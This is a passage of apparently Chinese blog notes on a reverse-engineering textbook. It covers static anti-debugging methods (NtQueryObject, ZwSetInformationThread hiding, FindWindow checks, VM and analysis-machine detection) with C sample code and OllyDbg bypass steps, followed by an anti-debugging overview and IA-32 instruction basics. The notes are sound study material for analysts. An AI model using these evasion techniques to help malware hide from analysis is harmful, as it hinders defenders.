class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tchar.h&quot;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> _<span class="hljs-title">OBJECT_INFORMATION_CLASS</span> &#123;</span><br>    ObjectBasicInformation,<br>    ObjectNameInformation,<br>    ObjectTypeInformation,<br>    ObjectAllTypesInformation,<br>    ObjectHandleInformation<br>&#125; OBJECT_INFORMATION_CLASS, *POBJECT_INFORMATION_CLASS;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">MyNtQueryObject</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LSA_UNICODE_STRING</span> &#123;</span><br>        USHORT Length;<br>        USHORT MaximumLength;<br>        PWSTR Buffer;<br>    &#125; LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;<br><br>    <span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span> <span class="hljs-params">(WINAPI *NTQUERYOBJECT)</span><span class="hljs-params">(</span><br><span class="hljs-params">        HANDLE Handle,</span><br><span class="hljs-params">        OBJECT_INFORMATION_CLASS ObjectInformationClass,</span><br><span class="hljs-params">        PVOID ObjectInformation,</span><br><span class="hljs-params">        ULONG ObjectInformationLength,</span><br><span class="hljs-params">        PULONG ReturnLength</span><br><span class="hljs-params">    )</span>;<br>    <br>    <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> pack(1)</span><br>    <span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">OBJECT_TYPE_INFORMATION</span> &#123;</span><br>        UNICODE_STRING TypeName;<br>        ULONG TotalNumberOfHandles;<br>        ULONG TotalNumberOfObjects;<br>    &#125;OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;<br><br>    <span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">OBJECT_ALL_INFORMATION</span> &#123;</span><br>        ULONG                   NumberOfObjectsTypes;<br>        OBJECT_TYPE_INFORMATION ObjectTypeInformation[<span class="hljs-number">1</span>];<br>    &#125; OBJECT_ALL_INFORMATION, *POBJECT_ALL_INFORMATION;<br>    <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> pack()</span><br>       <br>    POBJECT_ALL_INFORMATION pObjectAllInfo = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">void</span> *pBuf = <span class="hljs-literal">NULL</span>;<br>    ULONG lSize = <span class="hljs-number">0</span>;<br>    BOOL bDebugging = FALSE;<br><br>    NTQUERYOBJECT pNtQueryObject = (NTQUERYOBJECT)<br>                                    GetProcAddress(GetModuleHandle(<span class="hljs-string">L&quot;ntdll.dll&quot;</span>), <br>                                                   <span class="hljs-string">&quot;NtQueryObject&quot;</span>);<br><br>    <span class="hljs-comment">// Get the size of the list</span><br>    pNtQueryObject(<span class="hljs-literal">NULL</span>, ObjectAllTypesInformation, &amp;lSize, <span class="hljs-keyword">sizeof</span>(lSize), &amp;lSize);<br><br>    <span class="hljs-comment">// Allocate list buffer</span><br>    pBuf = VirtualAlloc(<span class="hljs-literal">NULL</span>, lSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<br><br>    <span class="hljs-comment">// Get the actual list</span><br>    pNtQueryObject((HANDLE)<span class="hljs-number">0xFFFFFFFF</span>, ObjectAllTypesInformation, pBuf, lSize, <span class="hljs-literal">NULL</span>);<br><br>    pObjectAllInfo = (POBJECT_ALL_INFORMATION)pBuf;<br><br>    UCHAR *pObjInfoLocation = (UCHAR *)pObjectAllInfo-&gt;ObjectTypeInformation;<br>    POBJECT_TYPE_INFORMATION pObjectTypeInfo = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">for</span>( UINT i = <span class="hljs-number">0</span>; i &lt; pObjectAllInfo-&gt;NumberOfObjectsTypes; i++ )<br>    &#123;<br>        pObjectTypeInfo = (POBJECT_TYPE_INFORMATION)pObjInfoLocation;<br>        <span class="hljs-keyword">if</span>( wcscmp(<span class="hljs-string">L&quot;DebugObject&quot;</span>, pObjectTypeInfo-&gt;TypeName.Buffer) == <span class="hljs-number">0</span> )<br>        &#123;<br>            bDebugging = (pObjectTypeInfo-&gt;TotalNumberOfObjects &gt; <span class="hljs-number">0</span>) ? TRUE : FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <br>        <span class="hljs-comment">// calculate next struct</span><br>        pObjInfoLocation = (UCHAR*)pObjectTypeInfo-&gt;TypeName.Buffer;<br>        pObjInfoLocation += pObjectTypeInfo-&gt;TypeName.Length;<br>        pObjInfoLocation = (UCHAR*)(((ULONG)pObjInfoLocation &amp; <span class="hljs-number">0xFFFFFFFC</span>) + <span class="hljs-keyword">sizeof</span>(ULONG));<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>( pBuf )<br>    VirtualFree(pBuf, <span class="hljs-number">0</span>, MEM_RELEASE);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NtQueryObject(ObjectAllTypesInformation)\n&quot;</span>);<br>    <span class="hljs-keyword">if</span>( bDebugging )  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  =&gt; Debugging!!!\n\n&quot;</span>);<br>    <span class="hljs-keyword">else</span>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  =&gt; Not debugging...\n\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, TCHAR* argv[])<br>&#123;<br>    MyNtQueryObject();<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\npress any key to quit...\n&quot;</span>);<br>    _gettch();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>练习：StaAD_NtQO.exe</p><p>在OllyDbg调试器中运行示例程序StaAD_NtQO.exe，显示“程序处于调试中”的信息，如图51-22所示。这是因为在NtQueryObject()API中探测到了调试对象。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220323114830299.png#alt=image-20220323114830299"></p><ul><li>破解之法</li></ul><p>按Ctrl+F2键重新运行OllyDbg调试器，在401059地址处按F2键设置断点，然后按F9键运行程序。</p><p>位于401059地址处的CALLESI指令用来调用ntdll.ZwQueryObject()API，如图51-23所示。此时查看栈可以发现，第二个参数的值为ObjectAllTypesInformation(3)，将该值修改为0后再执行401059地址处的指令，这样就无法探测到调试器的存在了。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220323115223413.png#alt=image-20220323115223413"></p><p>当然，直接钩取ntdll.ZwQueryObject() API,输入ObjectAllTypesInformation(3)值或操作结果值，也能不被探测到。</p><h1 id="51-6-ZwSetlnformationThread"><a href="#51-6-ZwSetlnformationThread" class="headerlink" title="51.6 ZwSetlnformationThread()"></a>51.6 ZwSetlnformationThread()</h1><p>下面介绍强制分离（Detach )被调试者和调试器的技术。利用ZwSetInformationThread() API, 被调试者可将自身从调试器中分离出来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> _<span class="hljs-title">THREAD_INFORMATION_CLASS</span> &#123;</span><br>    ThreadBasicInformation,<br>    ThreadTimes,<br>    ThreadPriority,<br>    ThreadBasePriority,<br>    ThreadAffinityMask,<br>    ThreadImpersonationToken,<br>    ThreadDescriptorTableEntry,<br>    ThreadEnableAlignmentFaultFixup,<br>    ThreadEventPair,<br>    ThreadQuerySetWin32StartAddress,<br>    ThreadZeroTlsCell,<br>    ThreadPerformanceCount,<br>    ThreadAmILastThread,<br>    ThreadIdealProcessor,<br>    ThreadPriorityBoost,<br>    ThreadSetTlsArrayAddress,<br>    ThreadIsIoPending,<br>    ThreadHideFromDebugger <span class="hljs-comment">// 17(0x11)</span><br>&#125; THREAD_INFORMATION_CLASS, *PTHREAD_INFORMATION_CLASS;<br><br>NTSYSAPI NTSTATUS <span class="hljs-title function_">ZwSetInformationThread</span><span class="hljs-params">(</span><br><span class="hljs-params">  [in] HANDLE          ThreadHandle,</span><br><span class="hljs-params">  [in] THREADINFOCLASS ThreadInformationClass,</span><br><span class="hljs-params">  [in] PVOID           ThreadInformation,</span><br><span class="hljs-params">  [in] ULONG           ThreadInformationLength</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>ZwSetInformationThread()函数是一个系统原生API（System Native API），顾名思义，它是用来为线程设置信息的。该函数拥有2个参数，第一个参数ThreadHandle用来接收当前线程的句柄，第二个参数ThreadlnformationClass表示线程信息类型，若其值设置为ThreadHideFromDebugger（0x11），调用该函数后，调试进程就会被分离出来。ZwSetInformationThread() API不会对正常运行的程序（非调试运行）产生任何影响，但若运行的是调试器程序，调用该API将使调试器终止运行，同时终止自身进程。</p><h2 id="51-6-1-练习：StaAD-ZwSIT-exe"><a href="#51-6-1-练习：StaAD-ZwSIT-exe" class="headerlink" title="51.6.1 练习：StaAD_ZwSIT.exe"></a>51.6.1 练习：StaAD_ZwSIT.exe</h2><p>首先在OllyDbg调试器中打开示例程序StaAD_ZwSIT.exe，然后分别在401027与401029地址处按F2键设置断点，按F9运行程序。</p><p>如图51-24所示，调试器在401027地址的断点处暂停，位于该地址处(401027)的CALL ESI指令用来调用ntdll.ZwSetlnformationThread() API。按F9键继续执行401027地址处的指令，这样就会分离出被调试进程并终止运行。而且，OllyDbg调试器将无法正常调试401029地址处的指令，出现运行错误。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220323120131316.png#alt=image-20220323120131316"></p><h2 id="51-6-2破解之法"><a href="#51-6-2破解之法" class="headerlink" title="51.6.2破解之法"></a>51.6.2破解之法</h2><p>简单的破解思路是：调用401027地址处的ZwSetInformationThread()API前，查找存储在栈中的第二个参数ThreadlnformationClass值，若其值为ThreadHideFromDebugger(0xl 1)，则修改为0后继续运行即可。</p><p>当然也可以钩取ZwSetInformationThread()API，并以同样方式操作函数的参数。</p><blockquote><p>利用ZwSetInformationThread()进行反调试的工作原理是：将线程隐藏起来，调试器就接收不到信息，从而无法调试。另外，Windows XP以后新增了 DebugActiveProcessStop() API。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">DebugActiveProcessStop</span><span class="hljs-params">(</span><br><span class="hljs-params">  [in] DWORD dwProcessId</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>DebugActiveProcessStop() API用来分离调试器和被调试进程，从而停止调试。而前面介绍的ZwSetlnformationThread() API则用来隐藏当前线程，使调试器无法再收到该线程的调试事件，最终停止调试（2个API易混淆，需牢记)。</p><h1 id="51-7-TLS回调函数"><a href="#51-7-TLS回调函数" class="headerlink" title="51.7 TLS回调函数"></a>51.7 TLS回调函数</h1><p>TLS回调函数是反调试技术中常用的函数，像前面介绍的技术一样，如果不明白其工作原理，使用时就会束手无策。</p><p>其实，我们并不能将TLS回调本身看作一种反调试技术，但是由于回调函数会先于EP代码执行，所以反调试技术中经常使用它。在TLS回调函数内部使用IsDebuggerPresent() 等函数判断调试与否，然后再决定是否继续运行程序。</p><p>第45章中对反调试相关内容与破解之法做了详细讲解，请各位参考。</p><h1 id="51-8-ETC"><a href="#51-8-ETC" class="headerlink" title="51.8 ETC"></a>51.8 ETC</h1><p>首先，要明白我们应用反调试技术的目的在于防止程序遭受逆向分析。不必非得为此费力判断自身进程是否处于被调试状态。一个更简单、更好的方法是，判断当前系统是否为逆向分析专用系统（非常规系统），若是，则直接停止程序。这样就出现了各种各样的反调试技术，这些技术都能从系统中轻松获取各种信息（进程、文件、窗口、注册表、主机名、计算机名、用户名、环境变量等)。这些反调试技术通常借助Win32 API获取系统信息来具体实现。下面简单介绍几个例子。</p><pre><code class="hljs">(1) 检测OllyDbg窗口 ← FindWindow()。(2) 检测OllyDbg进程 ← CreateToolhelp32Snapshot()。(3) 检查计算机名称是否为 “TEST”、“ANALYSIS” 等 ← GetComputerName()。(4) 检查程序运行路径中是否存在“TEST”、“SAMPLE”等名称 ← GetCommandLine()。(5) 检测虚拟机是否处于运行状态（查看虚拟机特有的进程名称—VMWareService.exe、VMWareTray.exe、VMWareUser.exe等）。</code></pre><p>上述这些反调试技术的破解之法并不难，所以著名的保护器中并不会使用它们（更棒的反调试技术多得是）。但偶尔有一些不怎么出名的保护器&#x2F;压缩器会使用，恶意代 码中也经常用到。如果平时不在意这些，那么很有可能会被它们“套住”，白白浪费许多时间。</p><h2 id="51-8-1-练习：StaAD-FindWindow-exe"><a href="#51-8-1-练习：StaAD-FindWindow-exe" class="headerlink" title="51.8.1 练习：StaAD_FindWindow.exe"></a>51.8.1 练习：StaAD_FindWindow.exe</h2><p>首先启动OllyDbg调试器，然后双击运行StaAD_FindWindow.exe程序，命令行窗口中就会显示“探测到调试器”的信息，如图51-25所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220323120642648.png#alt=image-20220323120642648"></p><p>StaAD_FindWindow.exe代码中调用了FindWindow()与GetWindowText() API，探测是否存在指定名称（OllyDbg、IDA Pro、WinDbg等）的调试器窗口。</p><h2 id="51-8-2破解之法"><a href="#51-8-2破解之法" class="headerlink" title="51.8.2破解之法"></a>51.8.2破解之法</h2><p>首先在OllyDbg调试器中打开练习文件，然后在401023地址处设置好断点并运行程序，如图51-26所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220323120914035.png#alt=image-20220323120914035"></p><p>图51-26的代码中共有3处调用FindWindow() API。40101E地址处的PUSH409D10指令中，地 址409D10指向Window Class名称字符串，它是FindWindow() API的第一个参数。转到409D10地址处，使用NULL覆盖Window Class名称字符串缓冲区，那么FindWindow() API将无法探测到相应调试器。</p><p>接下来要使GetWindowText() API失效。在401093地址处设置好断点并运行程序，如图51-27所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220323121426811.png#alt=image-20220323121426811"></p><p>调用GetWindowTextW() API的代码在4010B4地址处。若想正常调用GetWindowTextW() API，就不能执行4010AD地址处的条件跳转指令。要实现这一点，可以直接操作条件跳转语句，也可 以将其上GetDesktopWindow()与GetWindow() API的返回值（EAX寄存器）修改为NULL值。当然，钩取FindWindow() API与GetWindowText() API也是非常棒的方法。</p><h1 id="51-9小结"><a href="#51-9小结" class="headerlink" title="51.9小结"></a>51.9小结</h1><p>本章讲解了静态反调试的方法。其实，除了本章介绍的方法外，还有很多其他方法，而且调试过程中还会遇到更多，这些反调试方法你可能之前从未见过，只要认真分析、查找相关资料，一般都能找到好的破解之道，这是积累经验、不断进步的必经之路。本章还说明了静态反调试技术的破解之法，这些方法虽然不太难，但若完全不了解，调试时可能遭受很大困难。</p><p>反调试技术对OS有很强的依赖性，所以应用某个反调试技术时要事先确认：它是否可以应用到目标操作系统。实际调试中会使用多种调试器插件，借助这些插件可以有效回避反调试技术，使用起来非常方便。但调试器的插件也不是万能的，它们无法破解某些反调试技术。此时，了解这些插件的工作原理、学习基本的破解之法就显得非常有用了。</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第50章 反调试技术</title>
    <link href="/1999/04/30/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC50%E7%AB%A0%20%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"/>
    <url>/1999/04/30/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC50%E7%AB%A0%20%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<p>有经验的代码逆向分析人员通过调试能够轻松把握程序的代码执行流程与数据结构。这种调试行为使程序的“秘密” 一览无遗，这显然是程序开发人员不愿看到的结果，所以发展出了针对程序调试的“反调试”技术。’代码逆向分析人员也要学习“反调试”技术，主要基于以下2个原因：</p><p>（1）掌握各种反调试技术的工作原理后可以有效规避。</p><p>（2）学习反调试技术的过程中会学习大量高级逆向分析技术。</p><p>本章将向各位介绍一些具有代表性的反调试技术，使大家了解其工作原理，并学习如何规避。</p><h1 id="50-1-反调试技术"><a href="#50-1-反调试技术" class="headerlink" title="50.1 反调试技术"></a>50.1 反调试技术</h1><p>反调试技术属于高级逆向分析技术范畴，它涵盖了我们前面学过的各种技术，当然也有一些新增的知识。各位可以通过本章温故知新，另外，反调试技术也在不断发展，我们必须坚持学习新知识、新技术。</p><h2 id="50-1-1-依赖性"><a href="#50-1-1-依赖性" class="headerlink" title="50.1.1 依赖性"></a>50.1.1 依赖性</h2><p>反调试技术对调试器与OS有着很强的依赖性（Dependency)。也就是说，有些反调试技术仅能在特定版本OS下正常工作，而且不同种类调试器应用的反调试技术也略有不同。</p><blockquote><p>本章介绍的大部分技术可以正常应用在Windows XP SP3 ( 32位）与Windows 7(32位）操作系统下。调试某个应用了反调试技术的文件时，要充分考虑它对调试器和OS的依赖性。</p></blockquote><h2 id="50-1-2-多种反调试技术"><a href="#50-1-2-多种反调试技术" class="headerlink" title="50.1.2 多种反调试技术"></a>50.1.2 多种反调试技术</h2><p>反调试技术多种多样，日新月异。本章只讲解最具代表性的、应用范围最广的技术，同时也会介绍一些应用在各种PE保护器中的高级反调试技术</p><h1 id="50-2-反调试破解技术"><a href="#50-2-反调试破解技术" class="headerlink" title="50.2 反调试破解技术"></a>50.2 反调试破解技术</h1><p>反调试技术给逆向分析人员下了个“套”，阻止他们调试程序。而反调试破解技术（Anti-Anti-Debugging) 则用来解除程序中的 “套”，规避反调试技术。简言之，反调试破解技术就是逆向分析人员用来破解反调试技术的技术。</p><blockquote><p>国外的逆向分析技术论坛中经常出现“反调试破解技术” 一词，该术语较长，且语感不佳，我在后面的讲解中将使用“破解方法”、“规避方法”等词汇。</p></blockquote><h1 id="50-3-反调试技术的分类"><a href="#50-3-反调试技术的分类" class="headerlink" title="50.3 反调试技术的分类"></a>50.3 反调试技术的分类</h1><p>反调试技术多种多样，分类标准也五花八门。若分类得当，学习和理解就会非常容易。我从逆向分析人员的立场岀发，根据破解方法将反调试技术大致分为静态与动态两组，这两组内又可以细分出许多更小的组别。</p><p>调试运用了静态技术的程序文件时，只要在开始破解1次即可解除全部反调试限制。而运用动态技术的程序则要一边调试（遇到反调试代码时）一边破解。显然，破解应用了动态反调试技术的程序要困难得多。表50-1对各组别相关特征给出了详细说明，供各位参考。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC50%E7%AB%A0%20%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220322185418871.png#alt=image-20220322185418871"></p><h2 id="50-3-1-静态反调试技术"><a href="#50-3-1-静态反调试技术" class="headerlink" title="50.3.1 静态反调试技术"></a>50.3.1 静态反调试技术</h2><p>静态反调试技术主要用来探测调试器，若探测到，则使程序无法正常运行。所以在调试器中打开应用了静态反调试技术的文件时，文件将无法正常运行（RUN )。但破解了文件中应用的静态反调试技术后，调试器就可以正常运行该程序文件了（参考图50-1)。</p><h2 id="50-3-2-动态反调试技术"><a href="#50-3-2-动态反调试技术" class="headerlink" title="50.3.2 动态反调试技术"></a>50.3.2 动态反调试技术</h2><p>破解了程序文件的静态反调试技术后，并不能解决所有问题。若想了解程序的工作原理，还需要借助调试器中的跟踪技术来掌握程序代码与数据。但如果程序文件中应用了动态反调试技术，则很难再使用调试器中的跟踪技术，因为动态反调试技术会扰乱调试器跟踪的功能，使我们无法查看程序中的代码与数据（参考图50-2)。</p><blockquote><p>调试器中，运行命令用来运行被调试进程，而跟踪命令则用来逐条运行被调试者内部指令，并允许用户实时查看寄存器、内存（栈）等。跟踪类似于逐行调试，跟踪 过程中，调试器与被调试进程相互往来大量调试事件。动态反调试技术就巧妙运用这些事件与调试器的工作原理来实现反调试。</p></blockquote><p>后面会详细讲解各组别中具有代表性的一些技术。</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第49章 IA-32指令</title>
    <link href="/1999/04/09/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC49%E7%AB%A0%20IA-32%E6%8C%87%E4%BB%A4/"/>
    <url>/1999/04/09/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC49%E7%AB%A0%20IA-32%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>第49章IA-32指令</p><p>本章将学习有关IA-32指令（或称x86指令）的内容。各位刚开始会觉得指令比较复杂，但若</p><p>理解了指令的解析方法与原理，就能够轻松地将指令转换为反汇编代码。掌握了这些内容后，各</p><p>位的逆向分析技术水平将提高到一个新的层次。</p><h1 id="49-1-IA-32指令"><a href="#49-1-IA-32指令" class="headerlink" title="49.1 IA-32指令"></a>49.1 IA-32指令</h1><p>简言之，指令是指CPU能够识读的机器语言（Machine Language ）。IA-32指令指IA-32 （Intel</p><p>Architecture 32位）系列CPU使用的指令。</p><p>如图49-1所示，粗线框中的每一行都是1条指令（E8 CC270000、E9 A4FEFFFF、8BFF、55</p><p>等都是IA-32指令）。编程人员使用程序语言（C&#x2F;C++、JAVA, Python等）编写程序，而CPU则使</p><p>用机器语言，编程人员编写的程序源代码需要编译&#x2F;链接后转换为CPU可以识读的机器语言。</p><p>提示————————————————————————–</p><p>关于IA-32的详细说明请参考以下链接。</p><p>维基百科：<a href="http://zh.wikipedia.org/wiki/IA-32">http://zh.wikipedia.org/wiki/IA-32</a> （中文版）</p><p><a href="http://en.wikipedia.org/wiki/IA-32">http://en.wikipedia.org/wiki/IA-32</a> （英文版）</p><p><a href="http://ko.wikipedia.org/wiki/IA-32">http://ko.wikipedia.org/wiki/IA-32</a> （韩文版）</p><p>IA-32用户手册：<a href="http://www.intel.com/products/processor/manuals/">http://www.intel.com/products/processor/manuals/</a></p><h1 id="49-2常用术语"><a href="#49-2常用术语" class="headerlink" title="49.2常用术语"></a>49.2常用术语</h1><p>下面整理一下逆向分析常用术语。讲解IA-32指令的过程中将用到下列术语，准确理解并运</p><p>用这些术语将有助于与他人进行顺畅的交流与沟通</p><p>使用C&#x2F;C++语言（或汇编语言）创建出PE文件后，源代码就被转换成了机器码。一名合格的</p><p>逆向分析人员必须能够解析这些机器码，并理解其工作原理。但机器码是用二进制（0与1 ）表示</p><p>的，我们很难读懂它。因此一般要把机器码转换为16进制代码，转换后可读性提高，但我们识读</p><p>16进制代码时仍然会感到吃力。所以，最后借助调试器内嵌的反汇编器将机器码转换为反汇编代</p><p>码，识读这些反汇编代码就容易多了。</p><h2 id="49-2-1反汇编器"><a href="#49-2-1反汇编器" class="headerlink" title="49.2.1反汇编器"></a>49.2.1反汇编器</h2><p>图49-2显示的是我们熟悉的OllyDbg调试器的用户界面。OllyDbg调试器内嵌有IA-32反汇编</p><p>器（Disassembler ）0</p><p>图49-2中，1行代码就是1条指令。（A）区域中是16进制表示的IA-32指令，（B）区域中是与之对</p><p>应的反汇编代码，（C）区域是指令在内存（或文件）中的实际形式。</p><p>以地址401000处的指令为例，（A）区中的 “68 84B34000” 是IA-32指令，（B）区中</p><p>的“PUSH 0040B384” 为反汇编代码。</p><p>反汇编代码大致由助记符（Mnemonic ）与操作数（ Operand ）组成，助记符表明</p><p>指令功能，操作数指示操作对象。“PUSH 0040B384”指令中，PUSH为助记符，0040B384</p><p>为操作数。</p><p>内嵌在调试器中的反汇编器解析（C）区中的十六进制机器码，将它们切分为（A）区中的一条条</p><p>指令，然后将每条指令转换为（B）区中相应的反汇编代码。从易读性来看，（C）中代码低于（A）区代</p><p>码，（A）区代码又低于（B）区代码。逆向分析人员一般会阅读（B）区中的反汇编代码，并进行相应分</p><p>析。学习IA-32指令后就能分析（A）区中的代码了。</p><h2 id="49-2-2反编译器"><a href="#49-2-2反编译器" class="headerlink" title="49.2.2反编译器"></a>49.2.2反编译器</h2><p>近来，大量PE文件都是使用C&#x2F;C++&#x2F;VB&#x2F;Delphi语言编写的。反编译器（Decompiler）与反汇</p><p>编器在概念上类似，但是反汇编器用来将机器代码转换为反汇编代码，而反编译器则用来将机器</p><p>代码反编译为类似于源代码的代码（C&#x2F;C++&#x2F;VB+&#x2F;Delphi）（反编译时需选用相应语言的反编译</p><p>器）。当然，反编译岀的代码与源代码还是有一定差距的，但随着技术的不断发展，这种差距会</p><p>越来越小。</p><h2 id="49-2-3反编译简介"><a href="#49-2-3反编译简介" class="headerlink" title="49.2.3反编译简介"></a>49.2.3反编译简介</h2><p>本节我们将在IDA Pro分析工具中借助Hex-Rays Decompiler插件将C语言程序（机器代码）反</p><p>编译为类C语言的代码，并比较它与程序源码的不同。先看程序的C语言源代码，如图49-3所示。</p><p>get_folder_count（LPCSTRszPath）是个非常简单的函数，用来计算参数给定路径（szPath ）中</p><p>文件夹的个数^上述源代码经过编译后生成PE文件，在IDA Pro分析工具中使用Hex-Rays</p><p>Decompiler插件将生成的PE文件反编译（Decompile ）为类C语言代码，如图49~4所不。</p><p>各位一定大吃一惊。从图49-4中可以看到，反编译得到的代码与程序的源代码非常相似，仅</p><p>函数名称（sub_401000）、变量名称（vl、v2、v3、v8）不同而已。程序的代码较长且较复杂时,</p><p>反编译得到的代码可读性可能下降，但是借助反编译代码我们能够快速把握程序的代码结构，从</p><p>这个意义来说，反编译仍然是个非常棒的功能。</p><p>拥有这种强大功能的IDA Pro分析工具与Hex-Rays Decompiler插件都是付费的商业软件，且</p><p>价格昂贵，一般人难以承受，大部分都由公司购买使用。使用OllyDbg调试器打开上面的程序文</p><p>件，可以看到反汇编后的代码，如图49-5所示。</p><p>从图49-5中可以看到，反汇编代码看上去比较复杂，不如反编译后的代码更容易阅读，由此</p><p>可见反编译器多么有用。</p><p>提示————————————————————————–</p><p>请注意，反编译器也不是万能的。若使用保护器等工具故意打乱程序代码，或在</p><p>程序运行中使用一些操作技术，就不能反编译，或者使反编译后的代码更加复杂。所 以，学习高级逆向分析技术时一定要掌握反汇编代码和指令。</p><h1 id="49-3-IA-32指令格式"><a href="#49-3-IA-32指令格式" class="headerlink" title="49.3 IA-32指令格式"></a>49.3 IA-32指令格式</h1><p>提示————————————————————————–</p><p>现在我们学习中级逆向分析技术。如果你仍是逆向分析技术的初学者，不太理解</p><p>本部分内容，没关系，阅读后直接跳过即可。以后自己的技术水平提高了，需要了解</p><p>指令相关知识时再学习即可。以下内容是我在“ Intel® 64 and IA-32 Architectures</p><p>Software Developer’s Manuals”基础上整理而来的。更多详细说明请参考相关用户手册。</p><p>正文中使用的有关IA-32指令的图片均出自Intel的用户手册。</p><p>下面学习有关IA-32指令格式的知识。</p><p>如图49-6所示，IA-32指令由6部分组成，其中操作码项是必需的，其他项目都是可选的。接</p><p>下来对指令的各组成部分予以说明</p><h2 id="49-3-1指令前缀"><a href="#49-3-1指令前缀" class="headerlink" title="49.3.1指令前缀"></a>49.3.1指令前缀</h2><p>指令前缀（Instruction 